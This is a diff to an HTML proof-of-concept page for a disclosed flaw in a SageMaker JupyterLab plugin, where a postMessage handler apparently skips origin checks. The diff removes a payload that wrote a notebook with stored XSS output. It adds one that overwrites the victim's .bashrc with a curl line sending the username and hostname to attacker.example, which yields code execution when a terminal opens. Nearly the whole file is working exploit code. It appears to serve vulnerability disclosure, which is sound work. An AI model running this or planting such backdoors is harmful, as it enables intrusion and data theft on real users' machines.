@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Finding 4 — postMessage File Write PoC</title>
+  <title>Finding 4 — postMessage .bashrc Write PoC</title>
   <style>
     body { font-family: monospace; background: #0a0a0a; color: #c0c0c0; padding: 30px; }
     h1 { color: #ff4444; font-size: 18px; }
@@ -15,15 +15,12 @@
   </style>
 </head>
 <body>
-  <h1>CVE PoC: postMessage File Write (Finding 4)</h1>
-  <p style="color:#666;font-size:12px">@amzn/sagemaker-ui-doc-manager-jl-plugin — missing origin validation</p>
+  <h1>CVE PoC: postMessage .bashrc Backdoor (Finding 4)</h1>
+  <p style="color:#666;font-size:12px">@amzn/sagemaker-ui-doc-manager-jl-plugin — missing origin validation → RCE via .bashrc</p>
 
   <label>Target JupyterLab URL:</label>
   <input id="url" value="https://XXXXX.studio.us-east-2.sagemaker.aws/jupyterlab/default/lab" />
-  <label>File path to write:</label>
-  <input id="path" value="pwned.ipynb" />
   <label>Wait for Studio to load (ms):</label>
-
   <input id="wait" value="8000" />
 
   <button onclick="exploit()">Launch Exploit</button>
@@ -36,29 +33,8 @@ function status(msg, cls) {
 
 function exploit() {
   var url = document.getElementById('url').value.trim();
-  var path = document.getElementById('path').value.trim();
   var wait = parseInt(document.getElementById('wait').value) || 8000;
 
-  var notebook = {
-    nbformat: 4,
-    nbformat_minor: 5,
-    metadata: { kernelspec: { display_name: "Python 3", language: "python", name: "python3" } },
-    cells: [{
-      cell_type: "code",
-      source: "# This notebook was written by an attacker via cross-origin postMessage",
-      metadata: { trusted: true },
-      outputs: [{
-        output_type: "display_data",
-        metadata: {},
-        data: {
-          "text/html": "<img src=x onerror='alert(document.domain)'>"
-        }
-      }],
-      execution_count: 1
-    }]
-  };
-
-  // Phase 1: Open victim window
   var w = window.open(url, '_blank');
   if (!w) { status('Popup blocked — allow popups and retry.', 'err'); return; }
   status('Popup opened. Waiting ' + wait + 'ms for JupyterLab to load...', 'warn');
@@ -66,18 +42,16 @@ function exploit() {
   setTimeout(function() {
     if (w.closed) { status('Popup was closed.', 'err'); return; }
 
-    // Write trusted notebook with pre-rendered XSS output — auto-opens in JupyterLab
     w.postMessage({
       type: 'sagemaker:nbevent:OpenOrCreateFile',
       payload: {
-        type: 'notebook',
-        path: path,
-        content: notebook,
-        format: 'json'
+        type: 'file',
+        path: '.bashrc',
+        content: '# Backdoored via cross-origin postMessage (no origin validation)\ncurl https://attacker.example/exfil?user=$(whoami)\\&host=$(hostname)',
+        format: 'text'
       }
     }, '*');
-    status('Sent notebook → ' + path, 'ok');
-    status('If trusted, alert(document.domain) fires on open with no interaction.', 'warn');
+    status('Wrote .bashrc — RCE triggers on next terminal open.', 'ok');
   }, wait);
 }
 </script>
